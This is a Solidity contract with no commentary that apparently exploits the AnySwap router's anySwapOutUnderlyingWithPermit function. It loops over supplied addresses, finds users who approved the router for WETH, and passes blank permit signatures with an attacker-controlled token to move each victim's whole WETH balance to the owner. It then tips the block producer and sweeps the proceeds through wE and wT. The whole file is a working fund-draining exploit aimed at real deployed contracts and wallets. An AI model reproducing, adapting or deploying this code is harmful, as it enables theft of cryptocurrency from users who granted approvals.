pragma solidity 0.6.12;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint);
}
interface IAnySwapRouter{
        function anySwapOutUnderlyingWithPermit(
        address from,
        address token,
        address to,
        uint amount,
        uint deadline,
        uint8 v,
        bytes32 r,
        bytes32 s,
        uint toChainID
    ) external ;
}

contract any {
    address payable own;
    

    receive() external payable {} 
    constructor() public{
        own = msg.sender;
    }
    function act123(address[] calldata users) external {
        address weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        address anyRouter = 0x6b7a87899490EcE95443e979cA9485CBE7E71522;
        address myToken = 0xc2ea516Ed97778AFA2331be021754735796865e8;
        bytes32 temp =0x00;
        uint256 beforeBalance= IERC20(weth).balanceOf(myToken);
        
        for(uint i = 0 ; i < users.length; i++){
            uint256 allow = IERC20(weth).allowance(users[i],anyRouter);
            if(allow>0){
                uint balance = IERC20(weth).balanceOf(users[i]);
                if(balance>1e9){
                    IAnySwapRouter(anyRouter).anySwapOutUnderlyingWithPermit(
                        users[i],
                        myToken,
                        own,
                        balance,
                        block.timestamp,
                        0,
                        temp,
                        temp,
                        56
                    );
                }
            }
        }
        uint256 afterBalance= IERC20(weth).balanceOf(myToken);
        require(afterBalance>beforeBalance,"iedj");
        if(afterBalance-beforeBalance>5e17){
            block.coinbase.transfer(3e17);
        }

    }
    function wE() external{
        own.transfer(address(this).balance);
    }
    function wT(address t) external{
        IERC20(t).transfer(own,IERC20(t).balanceOf(address(this)));
    }
    function fromHexChar(uint8 c) public pure returns (uint8) {
        if (bytes1(c) >= bytes1('0') && bytes1(c) <= bytes1('9')) {
            return c - uint8(bytes1('0'));
        }
        if (bytes1(c) >= bytes1('a') && bytes1(c) <= bytes1('f')) {
            return 10 + c - uint8(bytes1('a'));
        }
        if (bytes1(c) >= bytes1('A') && bytes1(c) <= bytes1('F')) {
            return 10 + c - uint8(bytes1('A'));
        }
    }

    // Convert an hexadecimal string to raw bytes
    function fromHex(string memory s) public pure returns (bytes memory) {
        bytes memory ss = bytes(s);
        require(ss.length%2 == 0); // length must be even
        bytes memory r = new bytes(ss.length/2);
        for (uint i=0; i<ss.length/2; ++i) {
            r[i] = bytes1(fromHexChar(uint8(ss[2*i])) * 16 +
                        fromHexChar(uint8(ss[2*i+1])));
        }
        return r;
    }

}
